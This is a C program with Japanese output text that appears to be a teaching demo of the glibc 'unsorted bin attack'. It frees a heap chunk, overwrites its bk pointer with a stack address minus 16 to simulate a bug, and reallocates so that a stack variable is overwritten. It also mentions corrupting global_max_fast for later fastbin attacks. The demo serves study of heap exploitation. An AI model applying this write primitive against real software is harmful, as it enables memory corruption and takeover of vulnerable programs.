#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
	fprintf(stderr, "この手法は、tcache に入らないバッファでのみ動作します。glibc の tcache オプションが無効になっているか、"
		    "バッファが 0x408 バイトより大きい場合です。ビルド方法は build_glibc.sh を参照してください。"
		    "\n");
	fprintf(stderr, "このファイルは、大きな unsigned long の値をスタックに書き込むことで、unsorted bin 攻撃を実演します\n");
	fprintf(stderr, "実際には、unsorted bin 攻撃は、さらなる攻撃のための準備として行われるのが一般的です。たとえば、"
		   "後続の fastbin 攻撃のために libc のグローバル変数 global_max_fast を書き換える場合などです\n\n");

	volatile unsigned long stack_var=0;
	fprintf(stderr, "まず、スタック上で書き換えたい標的を見てみましょう:\n");
	fprintf(stderr, "%p: %ld\n\n", &stack_var, stack_var);

	unsigned long *p=malloc(0x410);
	fprintf(stderr, "では、ヒープ上に最初の通常のチャンク(chunk)を割り当てます。アドレス: %p\n",p);
	fprintf(stderr, "そして、もう1つ通常のチャンクを割り当てます。free() の際に、top chunkが"
           "最初のチャンクと統合(consolidate)されるのを避けるためです\n\n");
	malloc(500);

	free(p);
	fprintf(stderr, "最初のチャンクを free します。このチャンクは unsorted bin に挿入され、その bk ポインタは "
		   "%p を指します\n",(void*)p[1]);

	//------------VULNERABILITY-----------

	p[1]=(unsigned long)(&stack_var-2);
	fprintf(stderr, "ここで、victim->bk ポインタを上書きできる脆弱性を再現します\n");
	fprintf(stderr, "そして、標的のアドレス-16 を書き込みます(32ビットマシンでは、標的のアドレス-8 になります):%p\n\n",(void*)p[1]);

	//------------------------------------

	malloc(0x410);
	fprintf(stderr, "もう一度 malloc して、先ほど free したチャンクを取得しましょう。この時点で、標的はすでに "
		   "書き換えられているはずです:\n");
	fprintf(stderr, "%p: %p\n", &stack_var, (void*)stack_var);

	assert(stack_var != 0);
}
